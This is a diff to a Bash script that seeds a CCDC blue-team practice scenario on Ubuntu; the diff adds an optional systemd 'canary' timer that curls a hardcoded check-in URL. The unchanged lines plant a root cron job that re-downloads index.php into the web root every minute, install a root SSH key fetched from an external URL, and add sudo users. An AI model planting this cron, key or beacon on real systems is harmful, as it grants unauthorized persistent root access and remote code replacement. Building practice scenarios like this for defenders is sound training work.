@@ -2,10 +2,18 @@
 set -Eeuo pipefail
 
 # Redhavi: CCDC practice scenario for Ubuntu.
+PROGRAM_NAME="${REDHAVI_PROGRAM_NAME:-redhavi}"
+SCENARIO_NAME="${REDHAVI_SCENARIO_NAME:-redhavi}"
 WEB_REPO_URL="${WEB_REPO_URL:-https://github.com/banago/simple-php-website.git}"
 INDEX_URL="${INDEX_URL:-https://raw.githubusercontent.com/4rji/ccdc/main/index.php}"
 ROOT_KEY_URL="${ROOT_KEY_URL:-https://raw.githubusercontent.com/4rji/4rji/main/id_ed25519.pub}"
 LAB_SERVER="${LAB_SERVER:-10.5.8.11}"
+CANARY_URL="${CANARY_URL:-http://172.16.102.58:8081/checkin}"
+CANARY_INTERVAL="${CANARY_INTERVAL:-3}"
+CANARY_SERVICE="redhavi-canary.service"
+CANARY_TIMER="redhavi-canary.timer"
+REDHAVI_ENABLE_CANARY="${REDHAVI_ENABLE_CANARY:-0}"
+REDHAVI_REQUIRED_VERSION_ID="${REDHAVI_REQUIRED_VERSION_ID:-}"
 
 # These values pin the expected artifacts. If a URL changes, provide the
 # corresponding hash or fingerprint through the environment as well.
@@ -21,8 +29,8 @@ KEY_REF="${REDHAVI_ROOT}/var/lib/redhavi/root-key.pub"
 STATE_DIR="${REDHAVI_ROOT}/var/lib/redhavi"
 STATE_FILE="${STATE_DIR}/state"
 LOGIN_SHELL="${REDHAVI_LOGIN_SHELL:-/bin/bash}"
-SCENARIO_VERSION=2
-EXPECTED_CHECKS=9
+SCENARIO_VERSION="${REDHAVI_SCENARIO_VERSION:-2}"
+EXPECTED_CHECKS="${REDHAVI_EXPECTED_CHECKS:-9}"
 CRON_LINE="${CRON_LINE:-* * * * * curl -o ${WEB_ROOT_LOGICAL}/index.php http://${LAB_SERVER}/index.php}"
 
 PACKAGES=(
@@ -45,11 +53,11 @@ STATE_STARTED=0
 VERIFY_FAILURES=0
 
 log() {
-    printf '[redhavi] %s\n' "$*"
+    printf '[%s] %s\n' "$PROGRAM_NAME" "$*"
 }
 
 warn() {
-    printf '[redhavi][WARN] %s\n' "$*" >&2
+    printf '[%s][WARN] %s\n' "$PROGRAM_NAME" "$*" >&2
 }
 
 write_state() {
@@ -59,19 +67,25 @@ write_state() {
     mkdir -p "$STATE_DIR"
     tmp_state="$(mktemp "${STATE_FILE}.XXXXXX")"
     {
-        printf 'scenario=redhavi\n'
+        printf 'scenario=%s\n' "$SCENARIO_NAME"
         printf 'version=%s\n' "$SCENARIO_VERSION"
         printf 'status=%s\n' "$status"
         printf 'expected_checks=%s\n' "$EXPECTED_CHECKS"
         printf 'step=%s\n' "$CURRENT_STEP"
         printf 'updated_at=%s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
+        if [ "$REDHAVI_ENABLE_CANARY" = "1" ]; then
+            printf 'canary_url=%s\n' "$CANARY_URL"
+            printf 'canary_interval=%s\n' "$CANARY_INTERVAL"
+            printf 'canary_service=%s\n' "$CANARY_SERVICE"
+            printf 'canary_timer=%s\n' "$CANARY_TIMER"
+        fi
     } > "$tmp_state"
     chmod 600 "$tmp_state"
     mv -f "$tmp_state" "$STATE_FILE"
 }
 
 die() {
-    printf '[redhavi][ERROR] %s\n' "$*" >&2
+    printf '[%s][ERROR] %s\n' "$PROGRAM_NAME" "$*" >&2
     if [ "$STATE_STARTED" -eq 1 ]; then
         write_state incomplete 2>/dev/null || true
     fi
@@ -86,16 +100,16 @@ on_error() {
     if [ "$STATE_STARTED" -eq 1 ]; then
         write_state incomplete 2>/dev/null || true
     fi
-    printf '[redhavi][ERROR] Unexpected failure during step "%s", line %s (status %s).\n' \
-        "$CURRENT_STEP" "$line" "$status" >&2
+    printf '[%s][ERROR] Unexpected failure during step "%s", line %s (status %s).\n' \
+        "$PROGRAM_NAME" "$CURRENT_STEP" "$line" "$status" >&2
     exit "$status"
 }
 
 trap 'on_error "$LINENO"' ERR
 
 usage() {
-    cat <<'EOF'
-Usage: redhavi [--verify]
+    cat <<EOF
+Usage: ${PROGRAM_NAME} [--verify]
 
 With no options, seeds the CCDC scenario on an authorized Ubuntu machine.
 
@@ -104,7 +118,8 @@ With no options, seeds the CCDC scenario on an authorized Ubuntu machine.
 
 Optional variables for labs and tests:
   WEB_REPO_URL, INDEX_URL, INDEX_SHA256, ROOT_KEY_URL,
-  ROOT_KEY_FINGERPRINT, LAB_SERVER, CRON_LINE, and REDHAVI_LOGIN_SHELL.
+  ROOT_KEY_FINGERPRINT, LAB_SERVER, CRON_LINE, CANARY_URL,
+  CANARY_INTERVAL, and REDHAVI_LOGIN_SHELL.
 EOF
 }
 
@@ -126,6 +141,22 @@ require_ubuntu() {
     if [ "${ID:-}" != "ubuntu" ]; then
         die "This script is designed for Ubuntu. Detected: ${PRETTY_NAME:-unknown}"
     fi
+    if [ -n "$REDHAVI_REQUIRED_VERSION_ID" ] \
+        && [ "${VERSION_ID:-}" != "$REDHAVI_REQUIRED_VERSION_ID" ]; then
+        die "This script requires Ubuntu ${REDHAVI_REQUIRED_VERSION_ID}. Detected: ${PRETTY_NAME:-unknown}"
+    fi
+}
+
+validate_canary_settings() {
+    [ "$REDHAVI_ENABLE_CANARY" = "0" ] || [ "$REDHAVI_ENABLE_CANARY" = "1" ] \
+        || die "REDHAVI_ENABLE_CANARY must be 0 or 1."
+    if [ "$REDHAVI_ENABLE_CANARY" = "0" ]; then
+        return
+    fi
+    [[ "$CANARY_URL" =~ ^https?://[^[:space:]]+$ ]] \
+        || die "CANARY_URL must be an HTTP(S) URL without spaces."
+    [[ "$CANARY_INTERVAL" =~ ^[1-9][0-9]*$ ]] \
+        || die "CANARY_INTERVAL must be an integer greater than zero."
 }
 
 require_commands() {
@@ -274,6 +305,55 @@ install_cron_job() {
     rm -f "$tmp_cron" "$tmp_error"
 }
 
+write_systemd_unit() {
+    local path=$1
+    local content=$2
+    local tmp_unit
+
+    mkdir -p "${path%/*}"
+    tmp_unit="$(mktemp)"
+    printf '%s\n' "$content" > "$tmp_unit"
+    install -m 0644 "$tmp_unit" "$path"
+    rm -f "$tmp_unit"
+}
+
+setup_canary_timer() {
+    local service_path="${REDHAVI_ROOT}/etc/systemd/system/${CANARY_SERVICE}"
+    local timer_path="${REDHAVI_ROOT}/etc/systemd/system/${CANARY_TIMER}"
+    local systemd_canary_url="${CANARY_URL//%/%%}"
+    local service_content
+    local timer_content
+
+    [ "$REDHAVI_ENABLE_CANARY" = "1" ] || return
+    log "Configuring a monitor check-in every ${CANARY_INTERVAL} minutes..."
+
+    service_content="[Unit]
+Description=Redhavi CCDC dashboard check-in
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=oneshot
+ExecStart=/usr/bin/curl -fsS --max-time 15 -o /dev/null ${systemd_canary_url}"
+
+    timer_content="[Unit]
+Description=Run the Redhavi dashboard check-in periodically
+
+[Timer]
+OnBootSec=1min
+OnUnitActiveSec=${CANARY_INTERVAL}min
+AccuracySec=10s
+Unit=${CANARY_SERVICE}
+
+[Install]
+WantedBy=timers.target"
+
+    write_systemd_unit "$service_path" "$service_content"
+    write_systemd_unit "$timer_path" "$timer_content"
+    systemctl daemon-reload
+    systemctl enable --now "$CANARY_TIMER"
+}
+
 enable_services() {
     log "Starting and enabling apache2 and cron..."
     systemctl enable --now apache2
@@ -412,6 +492,18 @@ cron_is_seeded() {
     LC_ALL=C crontab -u root -l 2>/dev/null | grep -Fxq "$CRON_LINE"
 }
 
+canary_timer_is_seeded() {
+    local service_path="${REDHAVI_ROOT}/etc/systemd/system/${CANARY_SERVICE}"
+    local timer_path="${REDHAVI_ROOT}/etc/systemd/system/${CANARY_TIMER}"
+
+    [ -r "$service_path" ] \
+        && grep -Fq "$CANARY_URL" "$service_path" \
+        && [ -r "$timer_path" ] \
+        && grep -Fq "OnUnitActiveSec=${CANARY_INTERVAL}min" "$timer_path" \
+        && systemctl is-enabled --quiet "$CANARY_TIMER" \
+        && systemctl is-active --quiet "$CANARY_TIMER"
+}
+
 verify_expect() {
     local label=$1
     shift
@@ -436,6 +528,9 @@ verify_seeded() {
     verify_expect "interactive ccdc user in sudo" user_is_seeded ccdc
     verify_expect "interactive splunk user in sudo" user_is_seeded splunk
     verify_expect "root cron job seeded" cron_is_seeded
+    if [ "$REDHAVI_ENABLE_CANARY" = "1" ]; then
+        verify_expect "monitor canary timer active" canary_timer_is_seeded
+    fi
     verify_expect "apache2 active" systemctl is-active --quiet apache2
     verify_expect "cron active" systemctl is-active --quiet cron
     verify_expect "payload at $WEB_ROOT/index.php" payload_is_valid "$WEB_ROOT/index.php"
@@ -453,7 +548,7 @@ verify_seeded() {
 
 state_is_ready() {
     [ -r "$STATE_FILE" ] \
-        && grep -Fxq 'scenario=redhavi' "$STATE_FILE" \
+        && grep -Fxq "scenario=${SCENARIO_NAME}" "$STATE_FILE" \
         && grep -Fxq "version=${SCENARIO_VERSION}" "$STATE_FILE" \
         && grep -Fxq 'status=ready' "$STATE_FILE" \
         && grep -Fxq "expected_checks=${EXPECTED_CHECKS}" "$STATE_FILE"
@@ -490,6 +585,7 @@ main() {
 
     require_root
     require_ubuntu
+    validate_canary_settings
 
     if [ "$verify_only" -eq 1 ]; then
         require_commands
@@ -512,6 +608,9 @@ main() {
 
     CURRENT_STEP="root cron job"
     install_cron_job
+
+    CURRENT_STEP="monitor canary timer"
+    setup_canary_timer
 
     CURRENT_STEP="services"
     enable_services
